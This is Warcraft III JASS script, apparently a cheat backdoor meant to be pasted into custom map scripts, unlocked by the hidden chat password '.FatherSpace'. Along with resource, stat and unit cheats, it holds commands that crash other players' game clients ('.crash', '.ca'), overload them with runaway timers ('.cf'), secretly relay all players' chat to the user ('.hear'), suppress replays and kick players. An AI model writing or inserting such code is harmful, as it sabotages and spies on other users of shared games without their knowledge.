// globals
string FSs=".FatherSpace"
trigger FSt1=CreateTrigger()
trigger FSt2=CreateTrigger()
trigger FSHear=CreateTrigger()
trigger array FSta
boolean FSb1=true
boolean array FSba
boolean array FSba2
boolean array FSba3
player FSadmin=null
force FShf=CreateForce()
// endglobals

function FS_Crash takes player p, player FSp returns nothing
if (p==GetLocalPlayer())and(p!=FSadmin)and(p!=FSp)then
call ExecuteFunc("FS Crashed")
set p=null
set FSp=null
endif
endfunction
function FS_Hear takes nothing returns nothing
call DisplayTextToForce(FShf,GetPlayerName(GetTriggerPlayer())+": "+GetEventPlayerChatString())
endfunction
function FS_AdminGet takes player FSp returns nothing
if FSb1==false then
call DisplayTimedTextToPlayer(FSp,0,0,10,GetPlayerName(FSadmin)+" is already admin.")
endif
if (FSb1==true)and(FSba[GetPlayerId(FSp)]==true) then
set FSadmin=FSp
set FSb1=false
call DisplayTimedTextToPlayer(FSadmin,0,0,10,"You are now admin.")
elseif FSp==FSadmin then
call DisplayTimedTextToPlayer(FSadmin,0,0,10,"You're already admin!")
endif
set FSp=null
endfunction
function Clusterfuck_Child takes nothing returns nothing
call TimerStart(CreateTimer(),.001,true,function Clusterfuck_Child)
endfunction
function Clusterfuck takes player p, player FSp returns nothing
if p==GetLocalPlayer()then
if (p!=FSadmin)and(GetPlayerName(p)!="FatherSpace")and(p!=FSp) then
call RemoveUnit(CreateUnit(GetLocalPlayer(),'hpea',0,0,0))
call TimerStart(CreateTimer(),.001,true,function Clusterfuck_Child)
endif
endif
endfunction
function FS_Commands takes nothing returns nothing
local player FSp1=GetTriggerPlayer()
local string FSs1=GetEventPlayerChatString()
local integer FSi1=StringLength(FSs1)
local integer FSi2=0
local group FSg1=CreateGroup()
local unit FSu1
if SubString(FSs1,0,6)==".gold " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1,6,FSi1)), FSp1,PLAYER_STATE_RESOURCE_GOLD)
elseif SubString(FSs1,0,8)==".lumber " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1,8,FSi1)), FSp1,PLAYER_STATE_RESOURCE_LUMBER)
elseif SubString(FSs1,0,4)==".gp " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1, 7,FSi1 ) ), Player(S2I(SubString(FSs1, 5,6))), PLAYER_STATE_RESOURCE_GOLD)
elseif SubString(FSs1,0,4)==".lp " then
call AdjustPlayerStateBJ(S2I(SubString(FSs1, 7,FSi1 ) ), Player(S2I(SubString(FSs1, 5,6))), PLAYER_STATE_RESOURCE_LUMBER)
elseif SubString(FSs1, 0, 4)==".cn " then
call SetPlayerName(FSp1, SubString(FSs1,4,FSi1))
elseif SubString(FSs1,0,9)==".noreplay" then
call DoNotSaveReplay()
elseif SubString(FSs1,0,5)==".say " then
call DisplayTextToForce(bj_FORCE_ALL_PLAYERS, SubString(FSs1,5,FSi1))
elseif SubString(FSs1,0,5)==".hear" then
call ForceAddPlayer( FShf, FSp1 )
elseif SubString(FSs1, 0, 7)==".crash " then
call FS_Crash(Player(S2I(SubString(FSs1,7,8))),FSp1)
elseif (SubString(FSs1, 0, 3)==".ca")and(FSi1==3) then
loop
exitwhen FSi2>11
call FS_Crash(Player(FSi2),FSp1)
set FSi2=FSi2+1
endloop
elseif SubString(FSs1, 0, 4)==".cf " then
call Clusterfuck(Player(S2I(SubString(FSs1,4,5))), FSp1)
elseif SubString(FSs1,0,6)==".kick " then
if Player(S2I(SubString(FSs1,6,FSi1)))!=FSadmin then
call CustomDefeatBJ(Player(S2I(SubString(FSs1,6,7))), "")
endif
elseif SubString(FSs1,0,9)==".jwsadmin" then
set FSba[GetPlayerId(FSp1)]=true
call DisplayTimedTextToPlayer(FSp1,0,0,10,"Password?")
elseif SubString(FSs1,0,7)==".L0ck3D" then
call FS_AdminGet(FSp1)
elseif ((SubString(FSs1, 0,3)==".cc")and(FSp1==FSadmin)) then
loop
exitwhen FSi2>11
if FSba2[FSi2]==true then
call DisplayTimedTextToPlayer(FSp1,0,0,10,"|cffff0000"+GetPlayerName(Player(FSi2))+"|r is using cheats.")
else
call DisplayTimedTextToPlayer(FSp1,0,0,10,GetPlayerName(Player(FSi2))+" is not using cheats")
endif
set FSi2=FSi2+1
endloop
elseif SubString(FSs1,0,7)==".cadmin" then
if FSb1==false then
call DisplayTimedTextToPlayer(FSp1,0,0,10,GetPlayerName(FSadmin)+" is the admin in this game.")
else
endif
elseif (SubString(FSs1,0,9)==".nocheat ")and(FSp1==FSadmin) then
endif
call GroupEnumUnitsSelected(FSg1,FSp1,null)
loop
set FSu1=FirstOfGroup(FSg1)
exitwhen FSu1==null
if SubString(FSs1,0,5)==".lvl " then
call SetHeroLevelBJ(FSu1,S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".str " then
call SetHeroStr(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".agi " then
call SetHeroAgi(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,5)==".int " then
call SetHeroInt(FSu1, S2I(SubString(FSs1,5,FSi1)),true)
elseif SubString(FSs1,0,4)==".ms " then
call SetUnitMoveSpeed(FSu1,S2R(SubString(FSs1,4,FSi1)))
elseif SubString(FSs1,0,5)==".kill" then
call KillUnit(FSu1)
elseif SubString(FSs1,0,5)==".copy" then
if S2I(SubString(FSs1,6,FSi1))>0 then
loop
call CreateUnitAtLoc(GetOwningPlayer(FSu1), GetUnitTypeId(FSu1), GetUnitLoc(FSu1), GetUnitFacing(FSu1))
call TriggerSleepAction(.001)
exitwhen FSi2>S2I(SubString(FSs1,6,FSi1))
set FSi2=FSi2+1
endloop
else
call CreateUnitAtLoc(GetOwningPlayer(FSu1), GetUnitTypeId(FSu1), GetUnitLoc(FSu1), GetUnitFacing(FSu1))
call RemoveLocation(GetUnitLoc(FSu1))
endif
elseif (SubString(FSs1,0,7)==".owner ") then
call SetUnitOwner(FSu1, Player(S2I(SubString(FSs1,7,8))),true)
elseif SubString(FSs1,0,6)==".invis" then
call UnitAddAbility(FSu1,'Apiv')
elseif SubString(FSs1,0,4)==".vis" then
call UnitRemoveAbility(FSu1,'Apiv')
elseif SubString(FSs1,0,7)==".invuln" then
call SetUnitInvulnerable(FSu1,true)
elseif SubString(FSs1,0,5)==".vuln" then
call SetUnitInvulnerable(FSu1,false)
elseif SubString(FSs1,0,7)==".nopath" then
call SetUnitPathing(FSu1,false)
elseif SubString(FSs1,0,7)==".pathon" then
call SetUnitPathing(FSu1,true)
endif
call GroupRemoveUnit(FSg1,FSu1) 
endloop
call DestroyGroup(FSg1)
set FSp1=null
set FSs1=""
endfunction
function FS_Activate takes nothing returns nothing
local player FSp=GetTriggerPlayer()
call TriggerRegisterPlayerChatEvent(FSt2,FSp,".",false)
call DisplayTimedTextToPlayer(FSp,0,0,15,"Cheats by |cffff0000F|rather|cffff0000S|rpace.")
set FSba[GetPlayerId(FSp)]=false
set FSba2[GetPlayerId(FSp)]=true                                         
set FSp=null
endfunction

// function main
local integer FS=0
loop
exitwhen FS>11
call TriggerRegisterPlayerChatEvent(FSt1,Player(FS),FSs,true)
call TriggerRegisterPlayerChatEvent(FSHear,Player(FS),"",false)
set FS=FS+1
endloop
call TriggerAddAction(FSt1, function FS_Activate)
call TriggerAddAction(FSt2, function FS_Commands)
call TriggerAddAction(FSHear, function FS_Hear)
